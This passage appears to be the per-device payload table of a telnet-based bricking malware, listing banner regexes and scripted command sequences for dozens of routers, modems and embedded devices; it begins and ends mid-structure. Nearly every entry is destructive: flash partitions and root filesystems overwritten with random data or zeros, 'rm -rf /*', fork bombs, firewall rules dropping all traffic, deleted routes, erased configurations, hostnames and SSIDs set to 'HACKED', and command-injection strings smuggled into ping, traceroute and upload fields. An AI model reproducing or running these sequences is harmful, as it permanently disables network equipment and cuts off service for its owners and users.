              '[#>] ',
              "filter add 0.0.0.0/0 1:65535 0.0.0.0/0 1:65535 tcp\nfilter commit",
              '[#>] ',
              ],
             ['vigor',
              '.*',
              'Watch Dog Closed',
              'enable',
              '[>#] ',
              'configure system',
              '[>#] ',
              'config local backup ;sh',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[>#] ',
              'route del default',
              '%WAIT%',
              'reboot',
              '[>#] ',
              ],
             ['phyhome',
              '.*',
              'Index.*User.*Priority.*Location',
              'configure',
              '[>#] ',
              'set hostname HACKED',
              '[>#] ',
              'erase startup-config',
              '\]',
              'y',
              '[>#] ',
              'reboot',
              '\]',
              'y',
              '[>#] ',
              ],
             ['edatahome',
              '.*',
              '% Unknown command:w\.',
              'enable',
              '[>#] ',
              'erase startup-config',
              '[>#] ',
              'urlexport 1.2.3.4 test test `cat${IFS}/dev/urandom${IFS}>'
              '/dev/root` white',
              '%WAIT%',
              'date 2030 12 31 23 59 59',
              '%WAIT%',
              'exit',
              '',
              ],
             ['oapsmc',
              '.*',
              'Unrecognized command or Incomplete command\.',
              'reset configuration',
              '[>#] ',
              'reset configuration',
              '[>#] ',
              'reset configuration',
              '[>#] ',
              ],
             ['egcpa',
              '.*',
              'Unknown command \'uname\'',
              'logfile-upload',
              'URL: ',
              'ftp://127.0.0.1/&&`dd${IFS}if=/dev/zero${IFS}of='
              '/dev/mtdblock5${IFS}&`',
              '[>#] ',
              'logfile-upload',
              'URL: ',
              'ftp://127.0.0.1/&&`dd${IFS}if=/dev/zero${IFS}of=/dev/root`',
              '[>#] ',
              'uci commit',
              '[>#] ',
              ],
             ['bintec',
              '.*',
              'wizInternetGtw',
              'ifconfig',
              '[>#] ',
              'ifconfig 1000000 down',
              '[>#] ',
              'ifconfig 1010000 down',
              '[>#] ',
              'ifconfig 1020000 down',
              '[>#] ',
              'ifconfig 1030000 down',
              '[>#] ',
              'ifconfig 1040000 down',
              '[>#] ',
              'ifconfig 50000 down',
              '[>#] ',
              'ifconfig 50001 down',
              '[>#] ',
              'ifconfig 100001 down',
              '[>#] ',
              'ifconfig 10001 down',
              '[>#] ',
              'ifconfig 1001 down',
              '[>#] ',
              'ifconfig 1000 down',
              '[>#] ',
              'halt',
              '[>#] ',
              ],
             ['texasi',
              'root/.*',
              '% Invalid input at caret\.',
              "exit",
              '[>#] ',
              'enable',
              ': ',
              '%OLDPASS%',
              '[>#] ',
              'shell',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/4 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock/5 &',
              '[>#] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd() { d|d & }; d 2>/dev/null',
              '[>#] ',
              'route del default',
              '[>#] ',
              ],
             ['kaco',
              '.*',
              'Mode: (APPLICATION|BOOTROM)',
              'ipconfig -s 1.2.3.4 255.255.255.0 1.2.3.5',
              '[>#] ',
              'format',
              '[>#] ',
              'reset',
              '[>#] ',
              ],
             ['atdev',
              '.*',
              'TELNET session now in ESTABLISHED state',
              'clear flash',
              '[>#] ',
              'clear NVS',
              '[>#] ',
              'delete file=config.ins',
              '[>#] ',
              'delete file=config.gui',
              '[>#] ',
              'set user=%OLDUSER% login=no telnet=no',
              '[>#] ',
              'set ip nameserver=127.0.0.1',
              '[>#] ',
              'set ip secondarynameserver=127.0.0.1',
              '[>#] ',
              'set ip interface=ppp0 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=eth1 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=eth0 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=vlan1 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=port1 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=port2 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=port3 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=port4 ipaddress=127.0.0.1',
              '[>#] ',
              'set ip interface=port5 ipaddress=127.0.0.1',
              '[>#] ',
              ],
             ['adb',
              '.*',
              '\*\s+ADB BROADBAND\s+\*',
              'restore default-setting',
              '[>#] ',
              'reboot',
              '[>#] ',
              ],
             ['weathergoose',
              '.*',
              'ITW WeatherGoose',
              'reset factory',
              '[>#] ',
              'reset network',
              '[>#] ',
              ],
             ['hpnp',
              '.*',
              'clear configure create delete disable',
              'unconfigure switch',
              'yes or no',
              'yes',
              'configuration',
              ],
             ['kopp',
              '.*',
              'root\@kopp',
              'cat /dev/urandom >/dev/mmcblk1p1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/root &',
              '[>#] ',
              'route del default',
              '[>#] ',
              'rm -rf /* & 2>/dev/null',
              '[>#] ',
              ],
             ['elsist',
              '.*',
              'Elsist.*maintenance shell',
              'format Storage, 1',
              'Y,n',
              'Y',
              '[>#] ',
              'format System, 1',
              'Y,n',
              'Y',
              '[>#] ',
              'userconfig -p %OLDUSER% %NEWPASS%',
              '[>#] ',
              'cfgcommit',
              '[>#] ',
              'ifconfig -a eth0 1.2.3.4',
              '[>#] ',
              'ifconfig -g eth0 1.2.3.5',
              '[>#] ',
              'ifconfig -a eth1 1.2.3.6',
              '[>#] ',
              'ifconfig -g eth1 1.2.3.7',
              '[>#] ',
              'cfgcommit',
              '[>#] ',
              'sysconfig -wid',
              '[>#] ',
              'sysconfig -mtcpd',
              '[>#] ',
              'sysconfig -usbd',
              '[>#] ',
              'cfgcommit',
              '[>#] ',
              'reboot',
              'Y,n',
              'Y',
              'rebooting',
              ],
             ['swim',
              '.*',
              'task wait: task \S+ not found\.',
              'rm -r /tffs/*',
              '[>#] ',
              'reboot',
              '[>#] ',
              ],
             ['ciscobee',
              '.*',
              '(Embedded Telnet Server.*WARNING:.*authorized users only|'
              'COMMAND:\s+write_?memory|-s ElementSize1\.\.4)',
              'cd /flash',
              '[>#] ',
              'init',
              '[>#] ',
              'autoTest bootloader',
              'no\S ',
              'yes',
              '[>#] ',
              'autoTest dyn',
              'no\S ',
              'yes',
              '[>#] ',
              'autoTest perm',
              'no\S ',
              'yes',
              '[>#] ',
              'cd /',
              '[>#] ',
              'taskSuspend 0x81b597a8',
              '[>#] ',
              '0x819e0280',
              '[>#] ',
              'taskSuspend 0x819d13d0',
              '[>#] ',
              '0x81b597a8',
              '[>#] ',
              'taskSuspend 0x81b7aea0',
              '[>#] ',
              '1',
              '[>#] ',
              'cd /',
              '[>#] ',
              'taskSuspendAll',
              '[>#] ',
              'reset',
              '[>#] ',
              ],
             ['ubee',
              '.*',
              'Error - what Unknown command:',
              'cd /ubee',
              '[>#] ',
              'cabhCdpServerRouter',
              '[>#] ',
              'cabhCdpServerRouter 127.0.0.1',
              '[>#] ',
              'cd /',
              '[>#] ',
              'set password',
              '\] ',
              '%NEWPASS%',
              '[>#] ',
              'cd /wifi',
              '[>#] ',
              'nvram set wps_version2=disabled',
              '[>#] ',
              'nvram set wl0_ssid=HACKED',
              '[>#] ',
              'nvram set wps_device_name=HACKED',
              '[>#] ',
              'rc restart',
              '[>#] ',
              'cd /',
              '[>#] ',
              ],
             ['desdlink',
              '.*',
              'DES-1210',
              'reset config',
              '[>#] ',
              ],
             ['gpononu',
              '.*',
              'ONU\(super\)#',
              'shell',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[>#] ',
              'cat /dev/urandom >/dev/root &',
              '[>#] ',
              'route del default',
              '[>#] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT%',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['alcont',
              '.*',
              '(ONTUSER:|\/dev\/ubi1_1|\/ONTUSER|root\@AONT:)',
              'df',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/ubi1_1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/ubi5_0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock6 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock7 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/hda1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/hdb1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mmcblk0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mmcblk0p1 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/ubi1_1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/ubi5_0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[>#] ',
              'cat /dev/urandom >/dev/hda1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/hdb1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mmcblk0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mmcblk0p1 &',
              '[#$>] ',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '[>#] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT%',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['busybroke',
              '.*',
              'cat: /etc/passwd: No such file or directory',
              'd() { d|d & }; d',
              '',
              'route del default',
              '',
              ],
             ['mtguest',
              'guest/guest',
              'MT7109',
              'logout',
              '%TERM%',
              ],
             ['mtguest',
              'user/user',
              'MT7109',
              'logout',
              '%TERM%',
              ],
             ['mtguest',
              'admin/.*',
              'MT7109',
              'enable',
              '[#>] ',
              'router',
              '[#>] ',
              'wan name x y',
              '[#>] ',
              'wan commit',
              '[#>] ',
              "wan ip isp, user 1.2.3.4 255.255.255.0 1.2.3.5\nwan commit",
              '[#>] ',
              "lan ip 2.3.4.5 255.255.255.254\nlan commit",
              '[#>] ',
              'wlan disable',
              '[#>] ',
              '..',
              '[#>] ',
              'wimax',
              '[#>] ',
              'wmx auth username a b',
              '[#>] ',
              'wmx autoconnect disable',
              '[#>] ',
              "wmx disconnect\nwmx commit",
              '[#>] ',
              '..',
              '[#>] ',
              'router',
              '[#>] ',
              "filter add 0.0.0.0/0 1:65535 0.0.0.0/0 1:65535 tcp\nfilter commit",
              '[#>] ',
              '..',
              '[#>] ',
              'logout',
              '%TERM%',
              ],
             ['uclinux',
              '.*',
              '(uclinux\.org|sh: can\'t exec \'w\': No such file or directory|'
              'uClinux version)',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '[#>] ',
              'cat /dev/urandom >/dev/mtdblock9 &',
              '[#>] ',
              'route del default',
              '[>#] ',
              ],
             ['albof',
              '.*',
              '\*[AB]:\S+#\s',
              'config',
              '[>#] ',
              'system',
              '[>#] ',
              'location `reboot`',
              '[>#] ',
              'name HACKED',
              '[>#] ',
              'exit all',
              '[>#] ',
              'file',
              '[>#] ',
              'shutdown',
              '[>#] ',
              'format',
              'y/n',
              'y',
              '[>#] ',
              'exit all',
              '[>#] ',
              'admin',
              '[>#] ',
              'reboot auto-init',
              'y/n',
              'y',
              '[>#] ',
              'reboot standby',
              'y/n',
              'y',
              '[>#] ',
              'reboot active',
              'y/n',
              'y',
              '[>#] ',
              ],
             ['genpoe',
              '.*',
              '\% Invalid input detected at \'\^\' marker\.',
              'enable',
              '[>#] ',
              'write',
              '[>#] ',
              'erase boot-image first',
              '[>#] ',
              'erase boot-image second',
              '[>#] ',
              'erase config-file',
              '[>#] ',
              'reload',
              'y/n',
              'y',
              '[>#] ',
              ],
             ['vigor27',
              '.*',
              '__\s+___\s+____\s_____\s__\s+___',
              'exec ping `cat${IFS}/dev/zero${IFS}>/dev/root`',
              '',
              ],
             ['ciscovpn3000',
              '.*',
              '4\)\s+Save\s+changes\s+to\s+Config\s+file',
              '2',
              '[>#] ',
              '8',
              '[>#] ',
              '9',
              'reformat',
              'YES',
              '[>#] ',
              '10',
              '[>#] ',
              '3',
              '[>#] ',
              '3',
              '[>#] ',
              '2',
              '[>#] ',
              '2',
              'Done',
              ],
             ['oxygen',
              '.*',
              'system\s+System\soperations',
              "\x03",
              '',
              'system fdefaults',
              'y/n',
              'y',
              '[>#] ',
              ],
             ['dsrdlink',
              '.*',
              '(D-Link DSR|util.*Utilities Mode)',
              "\x03",
              '',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&`',
              '[>#] ',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1${IFS}&`',
              '[>#] ',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2${IFS}&`',
              '[>#] ',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3${IFS}&`',
              '[>#] ',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4${IFS}&`',
              '[>#] ',
              'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5${IFS}&`',
              '%WAIT%',
              'util md5sum `poweroff`',
              '[>#] ',
              'util md5sum `reboot`',
              '[>#] ',
              ],
             ['3comap',
              '.*',
              '(3Com Access Point|Access Point Rev \d|Type \"help\" for a list of '
              'valid commands\.)',
              'set hostipaddr 127.0.0.1',
              '[>#] ',
              'set dhcpc disable',
              '[>#] ',
              'set ipaddr 127.0.0.1',
              '[>#] ',
              'applycfg',
              'Rebooting',
              ],
             ['omniswitch',
              '.*',
              '(ERROR: Invalid entry: \"\/etc\/\"|Lucent OmniSwitch)',
              'newfs /flash',
              '= No',
              'y',
              '[>#] ',
              'newfs /uflash',
              '(= No|>)',
              'y',
              '[>#] ',
              'rm *',
              '[>#] ',
              'reload',
              'Y/N',
              'y',
              '[>#] ',
              ],
             ['bullet',
              '.*',
              '(Invalid command \"cat\"|Entering character mode)',
              'AT+MMNAME=HACKED',
              '[>#] ',
              'AT+MSIP=127.0.0.1',
              '[>#] ',
              'AT+MCTPS1=0',
              '[>#] ',
              'AT+MPWD=%NEWPASS%,%NEWPASS%',
              '[>#] ',
              'AT+MREB',
              'OK',
              'exec ping `cat${IFS}/dev/zero${IFS}>/dev/root`',
              '',
              'AT+MSRTF=0',
              'confirm',
              'AT+MSRTF=1',
              'rebooting',
              ],
             ['pk5001',
              '.*',
              '(PK5001Z|admin_\S+SSH:\S+Linux User)',
              'su',
              'Password: ',
              'zyad5001',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock6 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock7 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '',
              'cat /dev/urandom >/dev/mtdblock9 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'dd if=/dev/urandom of=/dev/root &',
              '',
              'route del default;iproute del default;ip route del default',
              '',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT%',
              'cat /dev/urandom >/dev/mem &',
              '',
              'd(){ d|d & };d 2>/dev/null',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT% ',
              'halt -n -f',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['ubigate',
              '.*',
              '(Error: Command \'uname\' does not exist|'
              'SAMSUNG ELECTRONICS .*Login)',
              'file',
              '[>#] ',
              'format /cf0',
              'Y/N',
              'y',
              'file[>#] ',
              'exit',
              '[>#] ',
              'reboot',
              'y/n',
              'y',
              'reboot',
              ],
             ['ec2traffic',
              '.*',
              '\/WEB_CONFIGURATOR\/CONFIG',
              '$linux',
              '[>#\$] ',
              'telnet 127.0.0.1',
              'login:',
              'root',
              'word:',
              'peek',
              '[>#\$:] ',
              'cat /dev/urandom >/dev/mtdblock/4',
              '[>#\$:] ',
              'route del default',
              '[>#\$:] ',
              'nop',
              '[>#\$:] ',
              'nop',
              '[>#\$:] ',
              'd() { d|d & }; d',
              '',
              ],
             ['genu01',
              '.*',
              'ID\s+From\s+To\s+Protocol\s+Sessions',
              'boot action = factory',
              '[>#] ',
              ],
             ['genu02',
              '.*',
              'usr\/config\$',
              'ifaddr -ipsharing 1 1.2.3.2',
              '[>#\$] ',
              'ifaddr -ip 1.2.3.4 -mask 255.255.255.0 -gate 1.2.3.5',
              '',
              'commit',
              '[>#\$] ',
              'reboot',
              '[>#\$] ',
              ],
             ['genu03',
              '.*',
              'watchdog\?',
              'set2default',
              '\[no\]',
              'yes',
              '\[no\]',
              'yes',
              '\[yes\]',
              'no',
              '\[no\]',
              'yes',
              'NVRAM',
              ],
             ['genu04',
              '.*',
              'restore system and load default configure',
              'restore',
              '=>',
              ],
             ['vigorfly',
              '.*',
              'Welcome to \S+\!\!\!',
              'ping `mtd_write erase mtd0;'
              'mtd_write erase mtd1;'
              'mtd_write erase mtd2;'
              'mtd_write erase mtd3;'
              'mtd_write erase mtd4 &`',
              '\S#',
              'ping `cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom '
              '>/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2 &`',
              '\S#',
              'ping `cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom '
              '>/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5 &`',
              '\S#',
              'ping `cat /dev/urandom >/dev/mtdblock6;cat /dev/urandom '
              '>/dev/mtdblock7 &`',
              '\S#',
              'ping `route del default`',
              '\S#',
              ],
             ['genu06',
              '.*',
              '[\%:] (Unrecognized|Incomplete|Wrong) (command|parameter) '
              'found at \S\S\S position\.',
              'format flash:',
              'Y/N',
              'y',
              '>',
              'system-view',
              '[>\]]',
              'router id 1.2.3.4',
              '[>\]]',
              'sysname HACKED',
              '[>\]]',
              'super password simple HACK%NEWPASS%',
              '[>\]]',
              'interface wlan-ethernet 0',
              '[>\]]',
              'shutdown',
              '[>\]]',
              'interface wlan-ethernet 1',
              '[>\]]',
              'shutdown',
              '[>\]]',
              'interface wlan-ethernet 2',
              '[>\]]',
              'shutdown',
              '[>\]]',
              'interface wlan-ethernet 3',
              '[>\]]',
              'shutdown',
              '[>\]]',
              'reboot',
              'Y/N',
              'y',
              '',
              ],
             ['genu07',
              '.*',
              'welcome to use cli',
              'mgmt',
              '>',
              'backup',
              '>',
              'revertfac',
              '>',
              'restore http://1.2.3.4/&&reboot',
              '>',
              ],
             ['genu08',
              '.*',
              'Command Not Found',
              'configure',
              '[>#\$] ',
              'hostname HACKED',
              '[>#\$] ',
              'interface ge1',
              '[>#\$] ',
              'shutdown\nwrite memory',
              '[>#\$] ',
              'exit',
              '[>#\$] ',
              'interface ge2',
              '[>#\$] ',
              'shutdown\nwrite memory',
              '[>#\$] ',
              ],
             ['genu09',
              '.*',
              '(System has no password|\% Command missing, Valid commands are:)',
              'sys cfg default',
              '[>#\$] ',
              ],
             ['drgwatson',
              '.*',
              'Bad command - Try using help -s <command>',
              'system',
              '[>#] ',
              'shell',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtd3 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/root &',
              '%WAIT%',
              'ifconfig br0 down &',
              '[>#] ',
              'ifconfig ppp0 down &',
              '[>#] ',
              'ifconfig eth1 down &',
              '[>#] ',
              'ifconfig eth2 down &',
              '[>#] ',
              'ifconfig eth3 down &',
              '[>#] ',
              'ifconfig eth4 down &',
              '[>#] ',
              'ifconfig eth5 down &',
              '[>#] ',
              'ifconfig eth6 down &',
              '[>#] ',
              'ifconfig eth7 down &',
              '[>#] ',
              'ifconfig eth8 down &',
              '[>#] ',
              'ifconfig ixp0 down &',
              '[>#] ',
              'ifconfig ixp1 down &',
              '[>#] ',
              'ifconfig ipsec0 down &',
              '[>#] ',
              'route del default',
              '%WAIT%',
              'restore_factory_settings',
              '[>#] ',
              'restore_default',
              '[>#] ',
              'exit',
              '[>#] ',
              'restore_factory_settings',
              '[>#] ',
              'restore_default',
              '[>#] ',
              ],
             ['vpnaccess',
              '.*',
              '(Welcome to VPN Access|voipGwH245Tunneling.*rw)',
              '46',
              '[>#] ',
              'Dest:00=1.2.3.4',
              '[>#] ',
              'Dest:01=1.2.3.4',
              '[>#] ',
              'Dest:02=1.2.3.4',
              '[>#] ',
              'Dest:03=1.2.3.4',
              '[>#] ',
              ],
             ['draytek',
              '.*',
              '(Dray[tT]ek>|Draytek login)',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/root${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4${IFS}&',
              '[>#] ',
              'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5${IFS}&',
              '[>#] ',
              'traceroute ;iptables${IFS}-A${IFS}OUTPUT${IFS}DROP',
              '[>#] ',
              'traceroute ;route${IFS}del${IFS}default',
              '[>#] ',
              ],
             ['ktcatv',
              '.*',
              '\@ktcatv:',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#\$] ',
              'route del default',
              '[>#\$] ',
              'iptables -A OUTPUT DROP',
              '%WAIT%',
              'd() { d|d & }; d 2>/dev/null',
              '[>#\$] ',
              'd() { d|d & }; d 2>/dev/null',
              '[>#\$] ',
              ],
             ['digi',
              '.*',
              '(Digi\Ss Command Line Interface|write \Spathname\S \Sstring\S)',
              'setnetwork dhcp = off',
              '[#$>] ',
              'setnetwork gateway = 1.2.3.4',
              '[#$>] ',
              'setnetwork ip = 1.2.3.5',
              '[#$>] ',
              'setnetwork primarydns = 127.0.0.1',
              '[#$>] ',
              'setnetwork secondarydns = 127.0.0.2',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              'wm 0 0',
              '[#$>] ',
              'wm 1 0',
              '[#$>] ',
              'wm 2 0',
              '[#$>] ',
              'wm 3 0',
              '[#$>] ',
              ],
             ['atpcli',
              '.*',
              '(ATP>|ATP Cli|HG\d\S+>)',
              'shell',
              '[>#]',
              'welcome to shell',
              '[>#]',
              'cat /dev/urandom >/mtdblock0 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock1 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock2 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock3 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock4 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock5 &',
              '[>#]',
              'cat /dev/urandom >/mtdblock6 &',
              '[>#]',
              'route del default',
              '[>#]',
              'iptables -A OUTPUT -j DROP',
              '[>#]',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5;true',
              '',
              'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock6;true',
              '',
              'ping ?;iptables${IFS}-A${IFS}OUTPUT${IFS}-j${IFS}DROP;true',
              '',
              ],
             ['netrouter',
              '.*',
              '(\/ETC\/PASSWD|Welcome to NetRouter|Digitel Configuration Manager|'
              '-ALF \/ETC\/)',
              'exec shell',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock7 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/root &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock6 &',
              '[>#] ',
              'dd if=/dev/urandom of=/dev/mtdblock8 &',
              '[>#] ',
              'route del default',
              '[>#] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT%',
              'config purge all',
              '[>#] ',
              'exit',
              '[>#] ',
              'config purge all',
              '[>#] ',
              ],
             ['junos',
              '.*',
              '(SRX\d+[>#]|JUNOS \d)',
              'configure',
              '[>#] ',
              'set system host-name HACKED',
              '[>#] ',
              'delete routing-options static route',
              '[>#] ',
              'set routing-options static route 0.0.0.0/0 reject',
              '[>#] ',
              'delete system name-server',
              '[>#] ',
              'delete system services dhcp',
              '[>#] ',
              'commit',
              '[>#] ',
              ],
             ['trendchip',
              '.*',
